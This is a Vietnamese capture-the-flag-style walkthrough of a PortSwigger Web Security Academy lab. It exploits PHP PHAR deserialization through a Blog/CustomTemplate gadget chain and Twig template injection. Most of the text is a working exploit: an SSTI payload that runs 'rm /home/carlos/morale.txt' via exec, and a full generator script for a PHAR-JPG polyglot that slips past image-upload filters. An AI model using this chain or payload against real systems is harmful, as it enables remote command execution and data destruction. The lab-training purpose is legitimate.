        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}
?>
```

```php
// https://0a6b002f04f6a5b883796fc800c30087.web-security-academy.net/cgi-bin/CustomTemplate.php~
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

### 1. Phân tích Gadget Chain (Chuỗi tấn công)

Mục tiêu là kích hoạt lệnh xóa file thông qua việc deserialize. Luồng xử lý (POP Chain) hoạt động như sau:

1. **Entry Point (Điểm vào)**: Chúng ta tải lên một file PHAR (được ngụy trang thành JPG). Khi server thực hiện một thao tác file (như file_exists trong avatar.php) với wrapper phar://, metadata trong file PHAR sẽ được deserialize.
2. **Object 1: CustomTemplate**:
    - Khi deserialize xong, script kết thúc (hoặc đối tượng bị hủy), PHP gọi __destruct().
    - __destruct() gọi unlink($this-&gt;lockFilePath()).
    - lockFilePath() nối chuỗi: 'templates/' . $this-&gt;template_file_path . '.lock'.
    - Nếu $this-&gt;template_file_path là một đối tượng Blog, PHP sẽ cố chuyển nó thành chuỗi bằng cách gọi __toString().
3. **Object 2: Blog**:
    - __toString() gọi $this-&gt;twig-&gt;render('index', ...)
    - Trước đó, khi vừa deserialize, __wakeup() đã được chạy. Nó khởi tạo môi trường Twig với template index có nội dung lấy từ $this-&gt;desc.
    - Nếu $this-&gt;desc chứa mã khai thác SSTI, lệnh sẽ được thực thi khi render được gọi.
4. **Payload SSTI**: Đoạn mã Twig để thực thi lệnh hệ thống:
    
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
    

---

### 2. Script tạo Payload (PHAR-JPG Polyglot)

Bạn cần chạy đoạn mã PHP dưới đây trên máy local của mình để tạo ra file ảnh độc hại.

**Lưu ý**: Để chạy script này, bạn cần đảm bảo file php.ini trên máy bạn có cấu hình phar.readonly = Off.

```php
<?php
// gen_payload.php

// 1. Định nghĩa lại các class để serialize (chỉ cần thuộc tính)
class Blog {
    public $user;
    public $desc;
    // $twig là private và được tạo lại trong __wakeup nên không cần set khi serialize

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }
}

class CustomTemplate {
    // Thuộc tính private cần giữ nguyên để format serialize đúng (\0CustomTemplate\0template_file_path)
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }
}

// 2. Chuẩn bị Payload SSTI (Server-Side Template Injection)
// Đây là payload sẽ chạy lệnh xóa file
$ssti_payload = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';

// 3. Xây dựng Chain
// Tạo đối tượng Blog chứa payload
$blog = new Blog('user', $ssti_payload);

// Tạo đối tượng CustomTemplate chứa đối tượng Blog
// Khi CustomTemplate bị hủy, nó sẽ ép kiểu $blog thành string -> kích hoạt __toString -> chạy payload
$object = new CustomTemplate($blog);

// 4. Tạo file PHAR Polyglot (Ngụy trang thành JPG)
$phar_file = 'payload.phar';
$jpg_file = 'avatar.jpg';

// Xóa file cũ nếu tồn tại
if (file_exists($phar_file)) unlink($phar_file);
if (file_exists($jpg_file)) unlink($jpg_file);

$phar = new Phar($phar_file);
$phar->startBuffering();

// Thêm stub đặc biệt: Giả mạo header JPG (FF D8 FF)
// __HALT_COMPILER(); là bắt buộc đối với PHAR
$phar->setStub("\xff\xd8\xff\xe0" . " " . "<?php __HALT_COMPILER(); ?>");

// Thêm metadata: Đây là nơi chứa object đã serialize sẽ được deserialize
$phar->setMetadata($object);

// Thêm một file rỗng vào trong phar (bắt buộc phải có ít nhất 1 file)
$phar->addFromString("test.txt", "test");

$phar->stopBuffering();

// Đổi tên thành .jpg để bypass bộ lọc upload ảnh
rename($phar_file, $jpg_file);

echo "Đã tạo thành công file payload: " . $jpg_file . "\n";
?>
```

### 3. Hướng dẫn thực hiện tấn công

Sau khi chạy script trên và có file avatar.jpg:

1. **Upload**:
    - Truy cập trang web bài lab.
    - Đăng nhập và vào phần upload avatar.
    - Tải lên file avatar.jpg vừa tạo.
2. **Khai thác**:
    - Mở **Burp Suite** và quan sát request khi bạn tải trang (hoặc request tải ảnh avatar). Thông thường URL sẽ dạng GET /cgi-bin/avatar.php?avatar=wiener.
    - Gửi request này sang **Repeater**.
    - Sửa tham số avatar để sử dụng wrapper phar://. Vì file bạn tải lên thường được lưu với tên user, payload sẽ là:
        
        GET /cgi-bin/avatar.php?avatar=phar://wiener
        
        *(Hoặc nếu server lưu nguyên tên file: phar://wiener.jpg / phar:///path/to/avatar.jpg tùy vào logic server, nhưng theo đề bài gợi ý thì chỉ cần phar://wiener)*.
        
3. **Kết quả**:
    - Khi server nhận request, nó gọi hàm file system lên phar://wiener.
    - PHP đọc metadata từ file ảnh -&gt; Deserialize CustomTemplate.
    - Script kết thúc -&gt; CustomTemplate::__destruct() chạy.
    - Chuỗi Blog -&gt; Twig kích hoạt.
    - Lệnh rm /home/carlos/morale.txt được thực thi.

### Tóm tắt logic quan trọng:

Tại sao chúng ta nhúng đối tượng Blog vào CustomTemplate?

- CustomTemplate là "ngòi nổ" (Trigger) nhờ hàm __destruct.
- Blog là "thuốc nổ" (Payload) nhờ hàm __toString gọi tới Twig engine dễ bị tấn công.
- Việc ép kiểu đối tượng thành chuỗi trong CustomTemplate::lockFilePath (. $this-&gt;template_file_path .) chính là cầu nối gắn 2 class này lại với nhau.
